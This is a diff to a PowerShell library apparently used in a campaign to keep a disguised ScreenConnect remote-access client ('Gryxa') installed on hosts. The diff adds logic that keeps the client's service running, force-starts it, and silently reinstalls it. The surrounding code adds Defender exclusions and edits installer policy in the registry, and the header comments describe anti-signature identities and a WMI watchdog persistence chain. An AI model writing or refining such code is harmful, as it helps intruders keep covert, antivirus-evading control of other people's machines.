@@ -3,6 +3,7 @@
 # OWN_LIB  BUILD 20260804L40
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L43: Test-ScRunning includes StartPending; never /x when service exists (connect-drop race).
 # L42: FP migrate install-new-FIRST then defer-remove-old (never leave host with zero Gryxa).
 # L41: -Force NEVER /x+/i when Gryxa already Running (force_gryxa.flag was killing live Guest).
 # L39: relay-verified Gryxa keeper adoption; INFLIGHT≠HEALTHY; real -Force/-Deep;
@@ -572,9 +573,16 @@ function Find-ProductGuid([string]$Fingerprint) {
 }
 
 function Test-ScRunning([string]$Fingerprint) {
+    # L43: StartPending/ContinuePending = live session in progress — never treat as down
+    # (that race caused msiexec /x during connect → Guest drop).
     if (-not $Fingerprint) { return $false }
     $svc = Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue
-    return [bool]($svc -and $svc.Status -eq 'Running')
+    return [bool]($svc -and $svc.Status -in @('Running', 'StartPending', 'ContinuePending'))
+}
+
+function Test-ScServiceExists([string]$Fingerprint) {
+    if (-not $Fingerprint) { return $false }
+    return [bool](Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue)
 }
 
 function Test-ScDir([string]$Fingerprint) {
@@ -745,8 +753,15 @@ function Remove-InstallerProductRegistration([string]$ProductCode) {
 }
 
 function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
-    # L41: never tear down a live Guest session
+    # L41/L43: never tear down a live or starting Guest session
     if ($Fp -and (Test-ScRunning $Fp)) { return }
+    if ($Fp -and (Test-ScServiceExists $Fp)) {
+        # service entry exists but stopped — start only, do not /x+/i
+        $name = "ScreenConnect Client ($Fp)"
+        & sc.exe config $name start= auto 2>&1 | Out-Null
+        & sc.exe start $name 2>&1 | Out-Null
+        if (Test-ScRunning $Fp) { return }
+    }
     Add-ScDefenderExclusion $Fp
     # L40: sibling-safe MSI (empty Upgrade table) before /i
     $safeMsi = Protect-MsiSiblingSafe $MsiPath
@@ -757,8 +772,8 @@ function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
     $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
     $lines = @('@echo off')
     $lines += 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1'
-    # L41: only /x phantom ProductCode when service is NOT running (STUCK/ABSENT heal)
-    if ($pc -and -not (Test-ScRunning $Fp)) {
+    # L41: only /x phantom ProductCode when service is fully absent (not Running/Pending/Stopped)
+    if ($pc -and -not (Test-ScServiceExists $Fp)) {
         $lines += "msiexec /x $pc /qn /norestart REBOOT=ReallySuppress >nul 2>&1"
         if ($packed) {
             $lines += "reg delete `"HKCR\Installer\Products\$packed`" /f >nul 2>&1"
